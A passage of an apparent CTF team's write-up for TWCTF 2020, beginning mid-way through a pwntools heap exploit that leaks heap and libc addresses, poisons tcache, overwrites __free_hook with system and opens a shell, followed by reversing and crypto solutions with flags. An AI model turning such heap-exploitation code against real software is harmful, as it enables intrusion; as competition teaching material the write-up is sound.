+    <span style="color:#66d9ef">return</span> int(((off<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">**</span><span style="color:#ae81ff">0.5</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dele</span>(index):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Your input: &#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Index&#39;</span>,str(index))
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Success&#39;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(title, size, payload):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Your input: &#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Title: &#39;</span>, title)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Size: &#39;</span>, str(size))
+    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;Puzzle: &#39;</span>, payload)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leakp</span>(index):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Your input: &#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Index&#39;</span>,str(index))
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Row</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s Numbers</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+    a <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Column</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s Numbers&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">17</span>]
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;:&#39;</span>,<span style="color:#e6db74">&#39;q&#39;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;invalid choice&#39;</span>)
+    <span style="color:#66d9ef">return</span> a
+
+<span style="color:#75715e"># leak heap info</span>
+offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400</span>
+add(<span style="color:#e6db74">&#39;test2&#39;</span>, calc(offset), <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>offset)
+leak <span style="color:#f92672">=</span> leakp(<span style="color:#ae81ff">2</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)[<span style="color:#ae81ff">2</span>:][::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">32</span>:]
+heap <span style="color:#f92672">=</span> int(leak,<span style="color:#ae81ff">2</span>)
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;leak: {}&#39;</span><span style="color:#f92672">.</span>format(hex(heap)))
+target <span style="color:#f92672">=</span> heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x60</span>
+new_heap <span style="color:#f92672">=</span> heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x520</span>
+heap_base <span style="color:#f92672">=</span> heap<span style="color:#f92672">-</span><span style="color:#ae81ff">0x11f90</span>
+
+<span style="color:#75715e"># add padding to prevent freed large chunk consolidate with top chunk </span>
+add(<span style="color:#e6db74">&#39;pad&#39;</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+dele(<span style="color:#ae81ff">2</span>)
+
+<span style="color:#75715e"># forge vector and maze chunk</span>
+forged_chunk1 <span style="color:#f92672">=</span> new_heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0xb0</span>
+forged_chunk2 <span style="color:#f92672">=</span> new_heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe0</span>
+forged <span style="color:#f92672">=</span> flat(new_heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x40</span>,new_heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x90</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x41</span>)
+forged<span style="color:#f92672">+=</span> flat(<span style="color:#ae81ff">0</span>, target, target, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0x81</span>)
+forged<span style="color:#f92672">+=</span> flat(<span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">5</span>, forged_chunk1, forged_chunk2, <span style="color:#ae81ff">0x81</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>)
+forged<span style="color:#f92672">+=</span> flat(<span style="color:#ae81ff">0x81</span>)<span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x81</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">40</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x121</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">20</span>
+forged <span style="color:#f92672">=</span> forged<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x400</span>,<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
+forged<span style="color:#f92672">+=</span> flat(new_heap, new_heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x10</span>, new_heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x38</span>)
+add(<span style="color:#e6db74">&#39;forged&#39;</span>, <span style="color:#ae81ff">0x70</span>, forged)
+
+<span style="color:#75715e"># leak libc info</span>
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Your input: &#39;</span>, <span style="color:#e6db74">&#39;4&#39;</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;0 : &#39;</span>)
+leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
+libc_base <span style="color:#f92672">=</span> leak<span style="color:#f92672">-</span><span style="color:#ae81ff">0x1ebfd0</span>
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;libc_base: {}&#39;</span><span style="color:#f92672">.</span>format(hex(libc_base)))
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Index&#39;</span>,<span style="color:#e6db74">&#39;-1&#39;</span>)
+
+<span style="color:#75715e"># free overlapped chunk to tcache </span>
+dele(<span style="color:#ae81ff">1</span>)
+add(<span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#ae81ff">50</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
+add(<span style="color:#e6db74">&#39;whatever&#39;</span>, <span style="color:#ae81ff">30</span>, <span style="color:#e6db74">&#39;v&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x48</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x81</span>)<span style="color:#f92672">+</span>p64(libc_base<span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__free_hook&#39;</span>]))
+add(<span style="color:#e6db74">&#39;whatever&#39;</span>, <span style="color:#ae81ff">30</span>, <span style="color:#e6db74">&#39;whatever&#39;</span>)
+
+<span style="color:#75715e"># write system to free hook</span>
+add(<span style="color:#e6db74">&#39;q&#39;</span>, <span style="color:#ae81ff">30</span>, p64(libc_base<span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]))
+
+<span style="color:#75715e"># trigger free hook</span>
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Your input: &#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Title: &#39;</span>, <span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x100</span>)
+
+p<span style="color:#f92672">.</span>interactive()</code></pre></div>
+<p>Flag: <code>TWCTF{watashi_puzzle_daisuki_mainiti_yatteru}</code>.
+Translating via google: <code>I'm pu → I love you</code>. WTF?</p>
+
+<h2 id="reversing-is-amazing-reverse-126-points">Reversing iS Amazing (Reverse, 126 points)<a hidden class="anchor" aria-hidden="true" href="#reversing-is-amazing-reverse-126-points">#</a></h2>
+
+<p>Solved by <em>Mystiz</em>.</p>
+
+<p>Open the binary with IDA. We can see that the binary signs <code>argv[1]</code> (which should be the flag) with RSA, then compares the signature with a given value. With that said, we have a RSA private key.</p>
+
+<p>Since we have the private key and the target signature (which the message is signed instead of its digest), we can simply recover the message by computing $s^e\ \text{mod}\ n$. Unpadding the message we have <code>TWCTF{Rivest_Shamir_Adleman}</code>.</p>
+
+<h2 id="tamarin-reverse-224-points">Tamarin (Reverse, 224 points)<a hidden class="anchor" aria-hidden="true" href="#tamarin-reverse-224-points">#</a></h2>
+
+<p>Solved by <em>harrier</em> and <em>Mystiz</em>.</p>
+
+<p>We are given an APK for the challenge. As how we work on every single Android reversing challenge, we use <code>apktool</code> to decode the file. Noticing that it is developed in Xamarin, we use the Github repository <a href="https://github.com/tjg1/mono_unbundle">tjg1/mono_unbundle</a> to unbundle <code>dll.so</code> to a C# DLL source file. We now have source codes to read!</p>
+
+<p>In particular we have this function:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> Func4(<span style="color:#66d9ef">string</span> flag) {
+    ParallelOptions parallelOptions = <span style="color:#66d9ef">new</span> ParallelOptions {
+        MaxDegreeOfParallelism = <span style="color:#ae81ff">4</span>
+    };
+    <span style="color:#66d9ef">byte</span>[] bytes = Encoding.ASCII.GetBytes(flag);
+    <span style="color:#66d9ef">int</span> length = flag.Length;
+    <span style="color:#66d9ef">if</span> ((length &amp; <span style="color:#ae81ff">3</span>) != <span style="color:#ae81ff">0</span>) {
+        Array.Resize&lt;<span style="color:#66d9ef">byte</span>&gt;(<span style="color:#66d9ef">ref</span> bytes, length + (<span style="color:#ae81ff">4</span> - (length &amp; <span style="color:#ae81ff">3</span>)));
+    }
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = length; i &lt; bytes.Length; i++) {
+        bytes[i] = <span style="color:#ae81ff">0</span>;
+    }
+    <span style="color:#66d9ef">if</span> (bytes.Length != Check.equations_arr.GetLength(<span style="color:#ae81ff">0</span>) * <span style="color:#ae81ff">4</span>) {
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+    }
+    <span style="color:#66d9ef">object</span> lockObj = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">object</span>();
+    ConcurrentBag&lt;<span style="color:#66d9ef">bool</span>&gt; checkResults = <span style="color:#66d9ef">new</span> ConcurrentBag&lt;<span style="color:#66d9ef">bool</span>&gt;();
+    List&lt;List&lt;<span style="color:#66d9ef">uint</span>&gt;&gt; list = <span style="color:#66d9ef">new</span> List&lt;List&lt;<span style="color:#66d9ef">uint</span>&gt;&gt;();
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; Check.equations_arr.GetLength(<span style="color:#ae81ff">0</span>); j++) {
+        List&lt;<span style="color:#66d9ef">uint</span>&gt; list2 = <span style="color:#66d9ef">new</span> List&lt;<span style="color:#66d9ef">uint</span>&gt;();
+        list2.Add(BitConverter.ToUInt32(bytes, j * <span style="color:#ae81ff">4</span>));
+        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> k = <span style="color:#ae81ff">0</span>; k &lt; Check.equations_arr.GetLength(<span style="color:#ae81ff">1</span>); k++) {
+            list2.Add(Check.equations_arr[j, k]);
+        }
+        list.Add(list2);
+    }
+    Parallel.ForEach&lt;List&lt;<span style="color:#66d9ef">uint</span>&gt;&gt;(list, parallelOptions, <span style="color:#66d9ef">delegate</span>(List&lt;<span style="color:#66d9ef">uint</span>&gt; equation) {
+        <span style="color:#66d9ef">object</span> lockObj = lockObj;
+        <span style="color:#66d9ef">lock</span> (lockObj) {
+            <span style="color:#66d9ef">uint</span> num = Check.Func3();
+            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> l = <span style="color:#ae81ff">0</span>; l &lt; <span style="color:#ae81ff">10000</span>; l++) {
+                num = Check.Func2(equation, num, equation.Count - <span style="color:#ae81ff">2</span>);
+            }
+            checkResults.Add(num == equation[equation.Count - <span style="color:#ae81ff">1</span>]);
+        }
+    });
+    <span style="color:#66d9ef">return</span> Enumerable.All&lt;<span style="color:#66d9ef">bool</span>&gt;(checkResults.ToArray(), (<span style="color:#66d9ef">bool</span> x) =&gt; x);
+}
+</code></pre></div>
+<p>Additionally, we have a <code>equations_arr</code> which is a $22\times32$ matrix. After a bit of reversing, this is how we interpreted the challenge (everything is taken modulo 2<sup>32</sup>):</p>
+
+<p>First we define $m_i$ be the $i$-th block (of 4 bytes) extracted from the flag. Define also the function $f_i$ such that $f_i(x) := m_i + a_{i,1} x + a_{i,2} x^2 + ... + a_{i,31} x^{31}$. The objective is to find $m_i$ such that $a_{i,32} = f_i^{(10000)}(n)$ for all $i = 1, 2, ..., 22$.</p>
+
+<p>What's $n$? It is the output of <code>Check.Func3()</code> and it actually is a random number... Is it even solvable?</p>
+
+<figure>
+    <img src="/images/2020-09-23-twctf/pepe-sweat.png"/> 
+</figure>
+
+
+<p>Turns out it is. We notice that $a_{ij}$ is an even number for $i=1, 2, ..., 22$ and $j=1, 2, ..., 31$. With a bit of deduction (<em>a bit means few sheets of paper and a lot of time</em>), we are able to derive a function $g_i$ such that $f_i^{(10000)}(n) = g_i(m_i)$ for all $n$, i.e., this would be a constant.</p>
+
+<p>After all, the last thing is to compute $m_i$. We have the full flag solving $g_i(m_i) = a_{i,32}$:</p>
+<pre><code>TWCTF{Xm4r1n_15_4bl3_70_6en3r4t3_N471v3_C0d3_w17h_VS_3n73rpr153_bu7_17_c0n741n5_D07_N3t_B1n4ry}</code></pre>
+<h2 id="easyhash-crypto-75-points">easy-hash (Crypto, 75 points)<a hidden class="anchor" aria-hidden="true" href="#easyhash-crypto-75-points">#</a></h2>
+
+<p>Solved by <em>Mystiz</em>.</p>
+
+<p>The challenge defines a new hash algorithm, <code>easy_hash</code>. It is defined by the following function:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">easy_hash</span>(x):
+    m <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(x) <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span>):
+        m <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, x[i:i <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>])[<span style="color:#ae81ff">0</span>]
+        m <span style="color:#f92672">=</span> m <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+    <span style="color:#66d9ef">return</span> m</code></pre></div>
+<p>The objective is to find a collision pair: for <code>twctf: please give me the flag of 2020</code></p>
+
+<p>Mathematically, if $M=m_1m_2m_3\dots m_n$, then</p>
+
+<p><span  class="math">\[\text{easy\_hash}(M):=\sum_{i=1}^{n-3}\left(\text{0x100}^3m_{i+3}+\text{0x100}^2m_{i+2}+\text{0x100}m_{i+1}+m_i\right).\]</span></p>
+
+<p>Equivalently it would be</p>
+
+<p><span  class="math">\[
+\begin{aligned}
+\text{easy\_hash}(M) := m_1& + \text{0x101} m_2 + \text{0x10101} m_3 + \text{0x1010101}\sum_{i=4}^{n-3}m_i \\
+\end{aligned}
+\]</span></p>
+
+<p>Hence, the characters in the middle have the weight 0x1010101 for hash computing. Knowing that <code>&quot;f&quot; = &quot;F&quot; + &quot; &quot;</code>, we can simply replace <code>flag</code> into <code>F lag</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl <span style="color:#e6db74">&#34;https://crypto01.chal.ctf.westerns.tokyo/&#34;</span> -X POST --data <span style="color:#e6db74">&#34;twctf: please give me the F lag of 2020&#34;</span>
+<span style="color:#75715e"># Congrats! The flag is TWCTF{colorfully_decorated_dream}</span></code></pre></div>
+<h2 id="sqrt-crypto-216-points">sqrt (Crypto, 216 points)<a hidden class="anchor" aria-hidden="true" href="#sqrt-crypto-216-points">#</a></h2>
+
+<p>Solved by <em>Mystiz</em>.</p>
+
+<p>In this challenge, we are given a ciphertext and a prime $p$. The ciphertext $c$ is computed from the message $m$ by $c \equiv m^{2^{64}}\ (\text{mod}\ p)$ - and the objective is of course to recover the flag $m$.</p>
+
+<p>My first attempt is to repeatedly use Tonelli-Shanks 64 times to compute modular square roots. However, it basically takes forever because the number of candidates could double when it go deeper by one level. This means that we will get two candidates for $c^{1/2}$, four candidates for $c^{1/4}$ and so on. The number grows exponentially and definitely would not be feasible.</p>
+
+<p>Fortunately, we can compute $m^{2^{30}}$ from $m^{2^{64}}$ without any hassle. Knowing that $p - 1 = 2^{30}q$, we can compute $d$ for $2^{34}d \equiv 1\ (\text{mod}\ p-1)$. Then $c^d \equiv m^{d\cdot 2^{64}}\equiv m^{2^{30}}\ (\text{mod}\ p)$. Then we can use Tonelli-Shanks for 30 times for the flag... Nope. That is still too slow.</p>
+
+<p>Instead we compute a 2<sup>30</sup>-th root of unity modulo $p$ (denote it as $r$). If we have an candidate $m_0$ such that $c \equiv {m_0}^{2^{64}}$, then the $m$ we want is any of the $m_0, rm_0, r^2m_0, ..., r^{2^{64}-1}m_0$, under modulo $p$. We can easily iterate through. It took me around fifteen minutes to compute the flag - <code>TWCTF{17s_v3ry_34sy_70_f1nd_th3_n_7h_r007}</code>.</p>
+
+<h2 id="twind-crypto-172-points">twin-d (Crypto, 172 points)<a hidden class="anchor" aria-hidden="true" href="#twind-crypto-172-points">#</a></h2>
+
+<p>Solved by <em>harrier</em> and <em>Mystiz</em>.</p>
+
+<p>This is a RSA challenge. Given a common modulus $n$, a pair of public keys are given such that their private exponents differ by two. Simply put,</p>
+
+<p><span  class="math">\[
+\begin{cases}\begin{aligned}
+e_2 (d+2) &\equiv 1\ \left(\text{mod}\ \phi(n)\right) \\
+e_1 d &\equiv 1\ \left(\text{mod}\ \phi(n)\right)
+\end{aligned}\end{cases}.
+\]</span></p>
+
+<p><em>harrier</em> has observed that $e_2d \equiv 1 - 2e_2$. With this, we can deduce a congruence relation that does not depend on $d$:</p>
+
+<p><span  class="math">\[0 \equiv e_1(e_2d) - e_2(e_1d) \equiv e_1(1-2e_2)-e_2 \equiv e_1 - e_2 - 2e_1e_2\ \left(\text{mod}\ \phi(n)\right).\]</span></p>
+
+<p>In this case, $e_1 - e_2 - 2e_1e_2$ will be a multiple of $\phi(n)$. We can compute an equivalent private key $d'$ by computing $ed' \equiv 1 \ \left(\text{mod}\ \phi(n)\right)$. Hence it suffices to recover the flag from the ciphertext - <code>TWCTF{even_if_it_is_f4+e}</code>.</p>
+
+<h2 id="the-melancholy-of-alice-crypto-242-points">The Melancholy of Alice (Crypto, 242 points)<a hidden class="anchor" aria-hidden="true" href="#the-melancholy-of-alice-crypto-242-points">#</a></h2>
+
+<p>Solved by <em>Mystiz</em>.</p>
+
+<p>In this challenge, we are asked to exploit ElGamal cryptosystem. The code supplied is responsible for generating key and encrypting the flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">N <span style="color:#f92672">=</span> <span style="color:#ae81ff">1024</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generateKey</span>():
+    p <span style="color:#f92672">=</span> getStrongPrime(N)
+    q <span style="color:#f92672">=</span> (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
+    x <span style="color:#f92672">=</span> getRandomRange(<span style="color:#ae81ff">2</span>, q)
+    g <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
+    h <span style="color:#f92672">=</span> pow(g, x, p)
+    pk <span style="color:#f92672">=</span> (p, q, g, h)
+    sk <span style="color:#f92672">=</span> x
+    <span style="color:#66d9ef">return</span> (pk, sk)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(m, pk):
+    (p, q, g, h) <span style="color:#f92672">=</span> pk
+    r <span style="color:#f92672">=</span> getRandomRange(<span style="color:#ae81ff">2</span>, q)
+    c1 <span style="color:#f92672">=</span> pow(g, r, p)
+    c2 <span style="color:#f92672">=</span> m <span style="color:#f92672">*</span> pow(h, r, p) <span style="color:#f92672">%</span> p
+    <span style="color:#66d9ef">return</span> (c1, c2)</code></pre></div>
+<p>Since everything looked pretty legit, we were stuck. Since $p$ is strong, if we write $p := 2q + 1$ then $q$ would be a prime. Alas, the prime is of 1024 bits long. The challenge is very secure, isn't it?</p>
+
+<p>Without any clues, we were messing around. Eventually we tried to factorize $p-1$.</p>
+
+<figure>
+    <img src="/images/2020-09-23-twctf/factordb.png"/> 
+</figure>
+
+
+<figure>
+    <img src="/images/2020-09-23-twctf/jackie-chan-what.png"/> 
+</figure>
+
+
+<p><em>Wait what?</em> Isn't $p$ a strong prime? Why are there so many factors? Turns out we have messed up the definition of strong prime. A strong prime $p$ is basically a prime with $p-1$ having a large prime factor. The desired $p$ they want should be <em>safe</em> but not <em>strong</em>.</p>
+
+<p>Okay, back on business. I used $r = 5710354319$ that is a factor of $p-1$. Then the remaining would be easy with discrete logarithm.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># p, q, g, h are redacted to save up some spaces</span>
+
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;challenge/ciphertext.txt&#39;</span>) <span style="color:#66d9ef">as</span> f:
+    cs <span style="color:#f92672">=</span> list(map(eval, f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)))
+
+r <span style="color:#f92672">=</span> <span style="color:#ae81ff">5710354319</span>
+<span style="color:#66d9ef">assert</span> (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> r <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>
+
+x <span style="color:#f92672">=</span> dlog<span style="color:#f92672">.</span>bsgs(pow(g, (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">//</span>r, p), pow(h, (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">//</span>r, p), p, r)
+<span style="color:#66d9ef">assert</span> pow(g, x <span style="color:#f92672">*</span> (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">//</span>r, p) <span style="color:#f92672">==</span> pow(h, (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">//</span>r, p)
+
+ms <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+m_map <span style="color:#f92672">=</span> list(map(<span style="color:#66d9ef">lambda</span> m: pow(m, (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">//</span>r, p), range(<span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x80</span>)))
+<span style="color:#66d9ef">print</span>(m_map)
+<span style="color:#66d9ef">for</span> c1, c2 <span style="color:#f92672">in</span> cs:
+    c1 <span style="color:#f92672">=</span> pow(c1, (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">//</span>r, p)
+    c2 <span style="color:#f92672">=</span> pow(c2, (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">//</span>r, p)
+
+    m <span style="color:#f92672">=</span> c2 <span style="color:#f92672">*</span> powmod(c1, <span style="color:#f92672">-</span>x, p) <span style="color:#f92672">%</span> p
+    <span style="color:#66d9ef">assert</span> m <span style="color:#f92672">in</span> m_map
+    ms <span style="color:#f92672">+=</span> bytes([m_map<span style="color:#f92672">.</span>index(m) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>])
+<span style="color:#66d9ef">print</span>(ms)</code></pre></div>
+<h2 id="xor-and-shift-encryptor-crypto-303-points">XOR and shift encryptor (Crypto, 303 points)<a hidden class="anchor" aria-hidden="true" href="#xor-and-shift-encryptor-crypto-303-points">#</a></h2>
+
+<p>Solved by <em>Mystiz</em>.</p>
+
+<p>This is more like a PPC challenge instead of a cryptography challenge. There is a <code>randgen</code> function, that serves as the core of the challenge, defined below:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">randgen</span>():
+  <span style="color:#66d9ef">global</span> s,p
+  a <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+  b <span style="color:#f92672">=</span> <span style="color:#ae81ff">13</span>
+  c <span style="color:#f92672">=</span> <span style="color:#ae81ff">37</span>
+  s0 <span style="color:#f92672">=</span> s[p]
+  p <span style="color:#f92672">=</span> (p <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">63</span>
+  s1 <span style="color:#f92672">=</span> s[p]
+  res <span style="color:#f92672">=</span> (s0 <span style="color:#f92672">+</span> s1) <span style="color:#f92672">&amp;</span> ((<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">64</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+  s1 <span style="color:#f92672">^=</span> (s1 <span style="color:#f92672">&lt;&lt;</span> a) <span style="color:#f92672">&amp;</span> ((<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">64</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+  s[p] <span style="color:#f92672">=</span> (s1 <span style="color:#f92672">^</span> s0 <span style="color:#f92672">^</span> (s1 <span style="color:#f92672">&gt;&gt;</span> b) <span style="color:#f92672">^</span> (s0 <span style="color:#f92672">&gt;&gt;</span> c))  <span style="color:#f92672">&amp;</span> ((<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">64</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+  <span style="color:#66d9ef">return</span> res</code></pre></div>
+<p>They are utilizing the &quot;inefficiency&quot; of the above function to encrypt the flag. In particular, they are using the $k_i$-th output to encrypt the $i$-th character of the flag (while $k_i$ could be up to 2<sup>100</sup>). Of course the naive approach doesn't work - you will wait forever.</p>
+
+<p>However, if we are only considering the state transition (i.e., how <code>s</code> is updated), we can see that it only involves bit shifting and XOR. Let's define $s_0, s_1, ...$ be a sequence with $s_i^{(k)}$ be the $k$-th bit of $s_i$. Imagine that the initial state being $(s_0, s_1, ..., s_{63})$ and the subsequent states being $(s_{64}, s_1, ..., s_{63})$, $(s_{64}, s_{65}, ..., s_{63})$ and so on.</p>
+
+<p>We can write transitions under the definition (note that the $+$ operation is actually operated under $\text{GF}(2)$, i.e., it is a XOR):</p>
+
+<ul>
+<li>$s_{i+64}^{(0)} := s_i^{(0)} + s_i^{(10)} + s_i^{(13)} + s_{i+63}^{(0)} + s_{i+63}^{(37)}$,</li>
+<li>$s_{i+64}^{(1)} := s_i^{(1)} + s_i^{(11)} + s_i^{(14)} + s_{i+63}^{(1)} + s_{i+63}^{(38)}$,</li>
+<li>...</li>
+</ul>
+
